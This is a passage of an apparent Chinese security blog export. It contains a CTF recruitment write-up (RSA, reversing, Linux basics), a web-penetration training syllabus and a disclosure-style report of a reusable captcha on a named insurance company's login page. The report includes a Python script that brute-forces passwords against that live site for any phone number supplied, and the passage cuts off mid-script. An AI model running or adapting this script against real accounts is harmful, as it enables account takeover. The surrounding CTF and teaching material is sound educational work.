class="keyword">in</span> <span class="built_in">zip</span>(m_hex[<span class="number">0</span>::<span class="number">2</span>], m_hex[<span class="number">1</span>::<span class="number">2</span>])])</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>最后结果为<code>Theres_more_than_one_way_to_RSA</code></p><blockquote><p>flag{Theres_more_than_one_way_to_RSA}</p></blockquote><h2 id="RSA3"><a href="#RSA3" class="headerlink" title="RSA3"></a>RSA3</h2><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Normally, you pick e and generate d from that. What appears to have happened in this case? What is likely about the size of d?</span><br><span class="line"></span><br><span class="line">Update: Fixed bug of flag.</span><br><span class="line"></span><br><span class="line">Notice: Please DO NOT use any RSA tools, solve this challenge by yourself.</span><br><span class="line"></span><br><span class="line">e = 165528674684553774754161107952508373110624366523537426971950721796143115780129435315899759675151336726943047090419484833345443949104434072639959175019000332954933802344468968633829926100061874628202284567388558408274913523076548466524630414081156553457145524778651651092522168245814433643807177041677885126141</span><br><span class="line">n = 380654536359671023755976891498668045392440824270475526144618987828344270045182740160077144588766610702530210398859909208327353118643014342338185873507801667054475298636689473117890228196755174002229463306397132008619636921625801645435089242900101841738546712222819150058222758938346094596787521134065656721069</span><br><span class="line">c = 169391604307213974710597693248166863262635321820709182280694059296079676696460036420655604420049971304712550027666676719989641872790226627271230072009450546099425697330508459430999175828530558172413805218170859212369467798719828240031394421896121823803700024559680572528969880625457942316782819682826344683732</span><br></pre></td></tr></table></figure><p>如果硬刚这到题的话，尝试直接分解 n，可以发现 n 是非常难分解的，但是题目描述中重点强调了 d 的大小，那么可能和 <a href="https://en.wikipedia.org/wiki/Wiener%27s_attack">Wiener’s Attack</a> 有关</p><p>当 *<em>d &lt; 1/3 * N ^ (1/4)*</em> 时，可以用 Wiener’s Attack 获取私钥 d</p><p>在生成私钥的时候，d 是根据 e 而获得的，当 e 过大或者过小的话，可以利用低解密指数攻击快速分解 n，获得 d 和 m。具体算法以及证明过程见 <a href="https://www.tr0y.wang/2017/11/06/CTFRSA/index.html#%E4%BD%8E%E8%A7%A3%E5%AF%86%E6%8C%87%E6%95%B0%E6%94%BB%E5%87%BB"> 低解密指数攻击</a></p><blockquote><p>flag{Are_any_RSA_vals_good_87768438250}</p></blockquote><h1 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h1><h2 id="what-is-IDA-150"><a href="#what-is-IDA-150" class="headerlink" title="what is IDA? (150)"></a>what is IDA? (150)</h2><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">我有一个 exe，你能找到 flag 吗?</span><br><span class="line"></span><br><span class="line">提示： IDA pro 6.8 以上版本</span><br></pre></td></tr></table></figure><p>下载一个 IDA pro，用 IDA(64 位)载入该程序。反汇编 main 函数，只有个 Ha Ha Ha</p><p><img src="/2018/10/10/BlueWhale2018%E5%B9%B4%E7%BA%B3%E6%96%B0%E9%A2%98%E7%9B%AEWriteup/TIM%E6%88%AA%E5%9B%BE20180911213232.png"></p><p>直接搜索字符串“flag”</p><p><img src="/2018/10/10/BlueWhale2018%E5%B9%B4%E7%BA%B3%E6%96%B0%E9%A2%98%E7%9B%AEWriteup/TIM%E6%88%AA%E5%9B%BE20180911213408.png"></p><blockquote><p>flag{can_y0u_see_me}</p></blockquote><h2 id="Xor-180"><a href="#Xor-180" class="headerlink" title="Xor (180)"></a>Xor (180)</h2><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">flag 就在文件里，为什么没有看到？</span><br><span class="line"></span><br><span class="line">注：异或运算</span><br></pre></td></tr></table></figure><p>用 IDA 载入开始逆向程序，直接逆向 main 函数，得到源码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax@10</span></span><br><span class="line">  __int64 v4; <span class="comment">// rsi@10</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> i; <span class="comment">// [sp+Ch] [bp-34h]@1</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> j; <span class="comment">// [sp+Ch] [bp-34h]@4</span></span><br><span class="line">  <span class="type">char</span> v7[<span class="number">40</span>]; <span class="comment">// [sp+10h] [bp-30h]@1</span></span><br><span class="line">  __int64 v8; <span class="comment">// [sp+38h] [bp-8h]@1</span></span><br><span class="line"></span><br><span class="line">  v8 = *MK_FP(__FS__, <span class="number">40LL</span>);</span><br><span class="line">  __isoc99_scanf(&amp;unk_8B4, v7, envp);</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i </span><br></pre></td></tr></table></figure><p>直接定位到第 16 行，不管 v7 是什么，它会和 flag 数组做一个对比，如果不一样就错误，所以 flag 数组里就放着 flag，双击 flag 数组跳转</p><p><img src="/2018/10/10/BlueWhale2018%E5%B9%B4%E7%BA%B3%E6%96%B0%E9%A2%98%E7%9B%AEWriteup/TIM%E6%88%AA%E5%9B%BE20180911213924.png"></p><p>可以看到 flag 就放在这里，不过是以 16 进制，先把数据复制出来，再接着回去看上面的代码</p><p><img src="/2018/10/10/BlueWhale2018%E5%B9%B4%E7%BA%B3%E6%96%B0%E9%A2%98%E7%9B%AEWriteup/TIM%E6%88%AA%E5%9B%BE20180911214704.png"></p><p>可以看到 flag 长度为 22，并且每个字符都和对应的 0 到 21 做了异或，由于异或是可逆的，因此将刚才复制出来的 flag 中每个字符都在异或一次即可</p><blockquote><p>flag{yes_you_know_Xor}</p></blockquote><h2 id="Random"><a href="#Random" class="headerlink" title="Random"></a>Random</h2><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Can a computer generate a truly random number?</span><br></pre></td></tr></table></figure><p>首先拖进 IDA 逆向 main 函数，需要使 check()返回非 0，另外可以看到 flag 的长度为 32</p><p><img src="/2018/10/10/BlueWhale2018%E5%B9%B4%E7%BA%B3%E6%96%B0%E9%A2%98%E7%9B%AEWriteup/TIM%E6%88%AA%E5%9B%BE20180924162538.png"></p><p>跟进 check 函数，可以发现程序对输入的字符串做了 4 件事</p><p><img src="/2018/10/10/BlueWhale2018%E5%B9%B4%E7%BA%B3%E6%96%B0%E9%A2%98%E7%9B%AEWriteup/TIM%E6%88%AA%E5%9B%BE20180924162749.png"></p><ol><li>给 rand 函数播种，种子为 0xDEADBEEF，由于种子是固定的，所以 random 函数输出的随机数序列是固定的</li><li>将输入字符串按字节加<code>random() mod 0x40</code></li><li>将上一步的字符串按字节异或<code>random() mod 0x100</code></li><li>检查上述步骤完成后的字符串是否和 byte_601080 数组相等，其中 byte_601080 数组为</li><li><img src="/2018/10/10/BlueWhale2018%E5%B9%B4%E7%BA%B3%E6%96%B0%E9%A2%98%E7%9B%AEWriteup/TIM%E6%88%AA%E5%9B%BE20180924163232.png"></li></ol><p>根据提示了解一下相关的资料就可以知道，glibc 的 <code>random()</code> 的实现使用线性同余引擎，在种子一定的情况下，会产生固定的伪随机序列。</p><p>所以只需要自己写个程序，设定种子为 <code>0xdeadbeef</code>，就可以<code>random()</code> 到相同的随机数，然后根据验证过程逆推即可得到 flag。</p><blockquote><p>flag{R4nd0m_1s_P5euDo_randomW0W}</p></blockquote><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="Welcome-50"><a href="#Welcome-50" class="headerlink" title="Welcome (50)"></a>Welcome (50)</h2><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">欢迎来到 Blue-Whale 纳新平台 </span><br><span class="line"> 下面的这个东西叫做 flag：</span><br><span class="line">flag&#123;Welcome_to_join_us&#125;</span><br><span class="line">所有题目的答案都是以上这个形式 </span><br><span class="line"> 比如这题，把这个复制到答案框就好了</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>签到题，直接复制粘贴</p><blockquote><p>flag{Welcome_to_join_us}</p></blockquote><h2 id="what-is-VM-100"><a href="#what-is-VM-100" class="headerlink" title="what is VM (100)"></a>what is VM (100)</h2><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">你知道虚拟机吗？</span><br><span class="line">我这里有一个 VMware 虚拟机镜像，怎么打开它呢？</span><br><span class="line">提示：下载 VMware14：</span><br><span class="line">https://www.vmware.com/products/workstation-pro/workstation-pro-evaluation.html</span><br><span class="line"></span><br><span class="line">镜像链接: https://pan.baidu.com/s/1uy0PkjE1Ik4xzklreg9ICQ</span><br><span class="line">密码: vxwg</span><br><span class="line"></span><br><span class="line">虚拟机：</span><br><span class="line">用户名：abc</span><br><span class="line">密码： 123456</span><br><span class="line"></span><br><span class="line">注意检查 CPU 虚拟化是否打开，没有打开的要在 BIOS 里打开。</span><br></pre></td></tr></table></figure><p>下载安装 VM14，打开下载的题目中的虚拟机</p><p><img src="/2018/10/10/BlueWhale2018%E5%B9%B4%E7%BA%B3%E6%96%B0%E9%A2%98%E7%9B%AEWriteup/TIM%E6%88%AA%E5%9B%BE20180917224924.png"></p><p><img src="/2018/10/10/BlueWhale2018%E5%B9%B4%E7%BA%B3%E6%96%B0%E9%A2%98%E7%9B%AEWriteup/TIM%E6%88%AA%E5%9B%BE20180917225713.png"></p><p>之后开启虚拟机，用题目给的用户名和密码登录，登陆后桌面上就是一个 flag</p><p><img src="/2018/10/10/BlueWhale2018%E5%B9%B4%E7%BA%B3%E6%96%B0%E9%A2%98%E7%9B%AEWriteup/TIM%E6%88%AA%E5%9B%BE20180919213440.png"></p><blockquote><p>flag{you_know_how_to_use_VM}</p></blockquote><h2 id="what-is-command-100"><a href="#what-is-command-100" class="headerlink" title="what is command (100)"></a>what is command (100)</h2><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">home 目录下有一个 flag 文件，怎么用命令找到它呢？</span><br><span class="line"></span><br><span class="line">注：此题 Linux 镜像为第二题镜像</span><br></pre></td></tr></table></figure><p>因为 flag 是隐藏文件，直接用 <code>ls</code> 命令是找不到的，得用 <code>ls -al</code> 命令显示所有文件，之后用 <code>cat</code> 命令打开即可</p><p><img src="/2018/10/10/BlueWhale2018%E5%B9%B4%E7%BA%B3%E6%96%B0%E9%A2%98%E7%9B%AEWriteup/TIM%E6%88%AA%E5%9B%BE20180919213746.png"></p><blockquote><p>flag{ls_is_what}</p></blockquote><h2 id="Linux-find-100"><a href="#Linux-find-100" class="headerlink" title="Linux find (100)"></a>Linux find (100)</h2><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">我在某个目录中藏了一个叫 findme 的文件，怎么能找到它呢？</span><br><span class="line"></span><br><span class="line">注：此题 Linux 镜像为第二题镜像</span><br></pre></td></tr></table></figure><p>直接用 find 命令即可：<code>sudo find / -name findme -print</code></p><p><img src="/2018/10/10/BlueWhale2018%E5%B9%B4%E7%BA%B3%E6%96%B0%E9%A2%98%E7%9B%AEWriteup/TIM%E6%88%AA%E5%9B%BE20180919214153.png"></p><blockquote><p>flag{you_know_wh1s_f1nd}</p></blockquote><h2 id="what-is-nc-100"><a href="#what-is-nc-100" class="headerlink" title="what is nc? (100)"></a>what is nc? (100)</h2><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">linux nc 命令是干什么的呢？</span><br><span class="line">nc 144.202.124.195 10001</span><br></pre></td></tr></table></figure><p>直接用 nc 命令：<code>nc 144.202.124.195 10001</code></p><p><img src="/2018/10/10/BlueWhale2018%E5%B9%B4%E7%BA%B3%E6%96%B0%E9%A2%98%E7%9B%AEWriteup/TIM%E6%88%AA%E5%9B%BE20180919213522.png"></p><blockquote><p>flag{nc_1s_this}</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> BlueWhale </tag>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BlueWhale 2018 Web 新生培训大纲</title>
      <link href="/2018/09/21/BlueWhale-2018-Web-%E6%96%B0%E7%94%9F%E5%9F%B9%E8%AE%AD%E5%A4%A7%E7%BA%B2/"/>
      <url>/2018/09/21/BlueWhale-2018-Web-%E6%96%B0%E7%94%9F%E5%9F%B9%E8%AE%AD%E5%A4%A7%E7%BA%B2/</url>
      
        <content type="html"><![CDATA[<h1 id="web 基础"><a href="#web 基础" class="headerlink" title="web 基础"></a>web 基础</h1><ol><li>网络安全法</li><li>Web 底层知识</li><li>Web 基本知识，如何配置一台服务器（lamp、wamp），搭建一个简单的网站</li><li>Web 编程语言：C（其他语言的基础，必会）、C++（视学习能力可选）、HTML、Javascript、PHP、Python（常用工具，必须掌握 requests 库的使用）、Java（视学习能力可选）、css、SQL</li><li>常用 Web 渗透的工具（nmap、BurpSuite、Wireshark 等，注意不要变成 Script Boy）</li><li>其他 Web 基础杂项，比如各种编码等</li></ol><h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><ol><li>Javascript 与 HTML 语法的简单讲解</li><li>XSS 中会用到的的一些概念，重点讲解 Cookie，Session，如何设置读取 Cookie，以及 Cookie 的权限</li><li>XSS 平台的使用</li><li>XSS 形成原理</li><li>XSS 利用<ol><li>最简单的使用 XSS 窃取 Cookie</li><li>怎么用 XSS 获取一些网页上的信息（如 URL 或者网页源码，甚至是剪贴板的内容，怎么弄个键盘记录器）</li><li>iframe 标签跨域窃取 Cookie</li><li>在过滤了某些字符的情况下如何绕过（重点）</li></ol></li><li>同源策略基本概念</li><li>CSP 基本概念以及格式讲解，要求会识别每句 CSP 代码的意义</li><li>结合几个例子讲解在某些情况下如何绕过 CSP</li><li>XSS 的一些小 trick</li><li>讲解如何防御 XSS</li><li>讲一讲 XSS 蠕虫 Samy（拓展知识面）</li></ol><h1 id="SQLi"><a href="#SQLi" class="headerlink" title="SQLi"></a>SQLi</h1><ol><li>数据库简介（类型：关系型、非关系型，常用数据库等）</li><li>SQL 语法的简单讲解</li><li>讲解 SQL 注入的成因</li><li>SQL 注入的一些基本概念与术语（如 SQL 注入类型）<ol><li>UNION 联合查询、多语句查询</li><li>直接显示数据</li><li>报错显示数据</li><li>盲注获取数据</li></ol></li><li>SQL 盲注（盲注的概念、分类：基于报错，基于时间延迟，基于 boolean）</li><li>通过 SQL 获取数据的方法与算法（暴力猜解、二分法、按位查询等）</li><li>SQL 注入中常用到的 Payload（主要以 Mysql 为例，但是不同数据库语法略有不用，也可以讲讲其他数据库的 payload，不过万变不离其宗）<ol><li>获取库名</li><li>获取表名</li><li>获取列名</li><li>获取数据</li><li>利用 SQL 注入读写文件</li><li>某些数据库如何利用 SQL 注入获取 shell（视新生接受能力选讲）</li></ol></li><li>SQL 注入的一些其他的小 trick</li><li>nosql 注入</li><li>SQL 注入中常会遇到的过滤手段，如何绕过（重点）</li><li>SQLMap 的基本使用（避免形成依赖）</li><li>如何防御 SQL 注入（目前常用的防御 SQL 注入的方法，PHP、Flask、Django 与 JavaWeb 是如何防御 SQL 注入的）</li></ol><h1 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h1><ol><li>PHP 介绍与语法的简单讲解</li><li>某些情况下 PHP 弱类型造成的漏洞<ol><li>== 与 ===</li><li>MD5 等哈希函数的弱类型比较</li><li>in_array 的弱类型比较</li><li>这类内容太多了，讲明白根本原理就行</li></ol></li><li>PHP 某些古怪的特性造成的漏洞<ol><li>如 GET、POST 数组等</li></ol></li><li>PHP 中某些函数的漏洞</li><li>常见的 PHP 文件包含漏洞与绕过方法</li><li>常见的 PHP 文件上传漏洞与绕过方法</li><li>PHP 反序列化漏洞<ol><li>反序列化成因</li><li>PHP 的面向对象</li><li>PHP 中的 Magic 函数</li><li>PHP 某个反序列化时的 CVE</li><li>PHP 反序列化的高级利用，POP 链等</li></ol></li><li>PHP 中伪随机数的预测</li><li>mt_rand 漏洞</li><li>rand 预测</li><li>PHP 的一些其他的小 trick、CVE 等 <br> 注：请注意不同的 PHP 版本的漏洞不同</li></ol><h1 id="Python 与 Java-Web"><a href="#Python 与 Java-Web" class="headerlink" title="Python 与 Java Web"></a>Python 与 Java Web</h1><ol><li>Python 格式化字符串漏洞</li><li>Python 反序列化漏洞</li><li>SSTI 漏洞<ol><li>成因</li><li>利用</li><li>常用 Payload</li><li>防御</li></ol></li><li>Python 小 trick（Python 黑魔法）</li><li>Python 沙箱绕过</li><li>Python 的一些 CVE</li><li>JavaWeb 的一些 CVE 讲解，如 Java 反序列化漏洞、Status 的漏洞等</li></ol><h1 id="CSRF 与 SSRF"><a href="#CSRF 与 SSRF" class="headerlink" title="CSRF 与 SSRF"></a>CSRF 与 SSRF</h1><ol><li>CSRF 的成因与危害</li><li>CSRF 绕过</li><li>CSRF 的利用与防御</li><li>SSRF 的成因与危害</li><li>SSRF 利用<ol><li>内网探测</li><li>端口探测</li><li>与 CRLF 综合利用</li></ol></li><li>SSRF 与 URL 跳转的绕过方法</li><li>SSRF 的防御</li></ol><h1 id="流量审计与 Web 杂项"><a href="# 流量审计与 Web 杂项" class="headerlink" title="流量审计与 Web 杂项"></a>流量审计与 Web 杂项</h1><ol><li><p>流量审计</p><ol><li>Wireshark 的详细使用技巧</li><li>过滤表达式</li><li>协议类型</li><li>如何导出抓到的感兴趣的东西</li><li>如何在 Wireshark 中快速定位到我们所关注的包</li><li>Wireshark 的统计技巧</li><li>命令行 Tshark 的使用以及 TCPdump 与 ngrep 的使用</li></ol></li><li><p>Web 杂项</p><ol><li>命令、代码注入，RCE</li><li>源码泄露（如 git、svn 等等）</li><li>逻辑漏洞（如越权等）</li><li>XXE<ol><li>成因</li><li>利用</li><li>防御</li></ol></li><li>nginx 的一些漏洞（配置错误导致的漏洞，如目录穿越等）</li></ol></li></ol><h1 id="CTF 题目选讲与知识总结"><a href="#CTF 题目选讲与知识总结" class="headerlink" title="CTF 题目选讲与知识总结"></a>CTF 题目选讲与知识总结 </h1><h1 id="无线渗透"><a href="# 无线渗透" class="headerlink" title="无线渗透"></a> 无线渗透</h1><h1 id="Web 综合渗透"><a href="#Web 综合渗透" class="headerlink" title="Web 综合渗透"></a>Web 综合渗透</h1>]]></content>
      
      
      <categories>
          
          <category> Hack </category>
          
      </categories>
      
      
        <tags>
            
            <tag> BlueWhale </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hacker Ethic</title>
      <link href="/2018/09/21/Hacker-Ethic/"/>
      <url>/2018/09/21/Hacker-Ethic/</url>
      
        <content type="html"><![CDATA[<ol><li><p>Acess to computers–and anything that might teach you something about the way the world works–should be unlimited and total. Always yield to the Hands-On Imperative!</p></li><li><p>All information should be free.</p></li><li><p>Mistrust Authority–Promote Decentralization.</p></li><li><p>Hackers should bt judged by their hacking, not bogus criteria such as degrees, age, race, or position.</p></li><li><p>You can create art and beauty on a computer.</p></li><li><p>Computers can change your life for the better.</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> Life </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Think </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>百年人寿保险股份有限公司网站表单验证码绕过</title>
      <link href="/2018/07/27/%E7%99%BE%E5%B9%B4%E4%BA%BA%E5%AF%BF%E4%BF%9D%E9%99%A9%E8%82%A1%E4%BB%BD%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8%E7%BD%91%E7%AB%99%E8%A1%A8%E5%8D%95%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87/"/>
      <url>/2018/07/27/%E7%99%BE%E5%B9%B4%E4%BA%BA%E5%AF%BF%E4%BF%9D%E9%99%A9%E8%82%A1%E4%BB%BD%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8%E7%BD%91%E7%AB%99%E8%A1%A8%E5%8D%95%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87/</url>
      
        <content type="html"><![CDATA[<p> 该网站下所有表单提交内的验证码非单次有效验证码 </p><p><img src="/2018/07/27/%E7%99%BE%E5%B9%B4%E4%BA%BA%E5%AF%BF%E4%BF%9D%E9%99%A9%E8%82%A1%E4%BB%BD%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8%E7%BD%91%E7%AB%99%E8%A1%A8%E5%8D%95%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87/TIM%E6%88%AA%E5%9B%BE20180726170858.png"></p><p> 只要不重新刷新加载验证码，则原有验证码一直有效，可进行表单爆破，经过测试发现全站所有验证码均有此类问题，以下截图模拟了一次对手机号为 17********5 的用户（鄙人自己注册的）登录密码的爆破 </p><p> 首先抓到登录的包 </p><p><img src="/2018/07/27/%E7%99%BE%E5%B9%B4%E4%BA%BA%E5%AF%BF%E4%BF%9D%E9%99%A9%E8%82%A1%E4%BB%BD%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8%E7%BD%91%E7%AB%99%E8%A1%A8%E5%8D%95%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87/TIM%E6%88%AA%E5%9B%BE20180726171412.png"></p><p> 之后送到 Intruder，payload 设置为 passWord</p><p><img src="/2018/07/27/%E7%99%BE%E5%B9%B4%E4%BA%BA%E5%AF%BF%E4%BF%9D%E9%99%A9%E8%82%A1%E4%BB%BD%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8%E7%BD%91%E7%AB%99%E8%A1%A8%E5%8D%95%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87/TIM%E6%88%AA%E5%9B%BE20180726171139.png"></p><p> 然后载入字典，为了不对服务器造成太大压力，鄙人生成了含有 100 个随机密码的字典，其中包含了真正的密码，之后就可以开始爆破了 </p><p><img src="/2018/07/27/%E7%99%BE%E5%B9%B4%E4%BA%BA%E5%AF%BF%E4%BF%9D%E9%99%A9%E8%82%A1%E4%BB%BD%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8%E7%BD%91%E7%AB%99%E8%A1%A8%E5%8D%95%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87/TIM%E6%88%AA%E5%9B%BE20180726165933.png"></p><p> 可以看到验证码形同虚设，最后爆破出真正的密码 </p><p><img src="/2018/07/27/%E7%99%BE%E5%B9%B4%E4%BA%BA%E5%AF%BF%E4%BF%9D%E9%99%A9%E8%82%A1%E4%BB%BD%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8%E7%BD%91%E7%AB%99%E8%A1%A8%E5%8D%95%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87/TIM%E6%88%AA%E5%9B%BE20180726171934.png"></p><p> 不知道后端是怎么处理 session 的验证码的，只要这个 session 没有请求过新的验证码，原验证码会一直有效。</p><p> 附爆破脚本 </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://www.aeonlife.com.cn/&#x27;</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;X-Requested-With&#x27;</span>: <span class="string">&#x27;xmlHttpRequest&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded; charset=UTF-8&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;zh-CN,zh;q=0.9&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Origin&#x27;</span>: url,</span><br><span class="line">    <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;http://www.aeonlife.com.cn/member/login.shtml&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">proxy = &#123;<span class="string">&#x27;http&#x27;</span>: <span class="string">&#x27;127.0.0.1:8080&#x27;</span>&#125;  <span class="comment"># for burp</span></span><br><span class="line">sess = requests.Session()</span><br><span class="line">sess.get(url + <span class="string">&#x27;member/loginin.shtml&#x27;</span>, headers=headers)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Get verify code</span></span><br><span class="line">ret = sess.get(url + <span class="string">&#x27;customerdyn/verify/getverifycode&#x27;</span>, headers=headers)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;verify.png&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(ret.content)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;[+] Get verify code success.&#x27;</span></span><br><span class="line"></span><br><span class="line">verify = Image.<span class="built_in">open</span>(<span class="string">&#x27;verify.png&#x27;</span>)</span><br><span class="line">verify.show()</span><br><span class="line">vcode = raw_input(<span class="string">&#x27;[*] Please input verify code which you get: &#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Brute login form</span></span><br><span class="line">success = <span class="literal">False</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;validateCode&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;mobileNum&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;passWord&#x27;</span>: <span class="string">&#x27;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">data[<span class="string">&#x27;mobileNum&#x27;</span>] = raw_input(<span class="string">&#x27;[*] Phone number you want to brute: &#x27;</span>)</span><br><span class="line">data[<span class="string">&#x27;validateCode&#x27;</span>] = vcode</span><br><span class="line">dic = raw_input(<span class="string">&#x27;[*] Dictionary absolute path: &#x27;</span>)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(dic, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> password <span class="keyword">in</span> f.readlines():</span><br><span class="line">        data[<span class="string">&#x27;passWord&#x27;</span>] = password.replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;[*] Tring password [%s]&#x27;</span> % data[<span class="string">&#x27;passWord&#x27;</span>]</span><br><span class="line">        ret = sess.post(url + <span class="string">&#x27;member/method/loginin.shtml&#x27;</span>,</span><br><span class="line">                        headers=headers, data=data)</span><br><span class="line">        <span class="keyword">if</span> json.loads(ret.content)[<span class="string">&#x27;status&#x27;</span>] == <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">            success = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> success <span class="keyword">is</span> <span 